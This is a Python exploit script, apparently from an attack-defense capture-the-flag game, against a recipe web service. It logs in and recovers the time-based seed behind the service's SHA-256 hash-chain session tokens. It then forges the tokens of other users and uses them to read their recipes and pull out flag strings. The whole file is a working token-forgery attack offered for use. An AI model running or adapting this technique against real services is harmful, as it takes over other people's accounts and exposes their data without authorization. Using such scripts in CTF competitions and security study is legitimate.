#!/usr/bin/env python3
import sys
import time
import re
import hashlib
import requests

TIMEOUT = 1
FLAG_RE = re.compile(r"[A-Z0-9]{31}=")

WINDOW_SECONDS = 3 * 60 * 60
TOKENS_PER_SEED = 500

def sha256(b):
    return hashlib.sha256(b).digest()

def register_and_login(base_url):
    username = "chef_test_user_9xk8q2b7m"
    password = "S3cureP@ssw0rd_test_2026"
    try:
        requests.post(base_url + "/api/register", json={"username": username, "password": password}, timeout=TIMEOUT)
    except Exception:
        pass
    r = requests.post(base_url + "/api/login", json={"username": username, "password": password}, timeout=TIMEOUT)

    if r.status_code != 200:
        sys.exit(1)

    # print(r.json()["token"])

    return r.json()["token"]

def find_seed(server_token_hex):
    server_token = bytes.fromhex(server_token_hex)
    now = int(time.time())
    for t in range(now, now - WINDOW_SECONDS, -1):
        state = str(t).encode()
        for _ in range(TOKENS_PER_SEED):
            state = sha256(state)
            if state == server_token:
                return t
    return None

def collect_flags(base_url, start_state):
    state = start_state
    seen = set()

    while True:
        state = sha256(state)
        token = state.hex()
        try:
            r = requests.get(
                base_url + "/api/recipes",
                headers={"Authorization": f"Bearer {token}"},
                timeout=TIMEOUT,
            )
            if r.status_code != 200:
                break

            for rec in r.json():
                rid = rec.get("id")
                if not isinstance(rid, int):
                    continue
                r2 = requests.get(
                    base_url + f"/api/recipes/{rid}",
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=TIMEOUT,
                )
                if r2.status_code != 200:
                    continue
                text = r2.json().get("recipe", "")
                for f in FLAG_RE.findall(text):
                    if f not in seen:
                        seen.add(f)
                        print(f)

        except Exception:
            break

        time.sleep(TIMEOUT)


def main():
    if len(sys.argv) < 3:
        print("Usage: sploit.py IP PORT")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    base_url = f"http://{ip}:{port}"
    server_token = register_and_login(base_url)
    seed = find_seed(server_token)

    if seed is None:
        sys.exit(1)

    state = str(seed).encode()
    collect_flags(base_url, state)

if __name__ == "__main__":
    main()
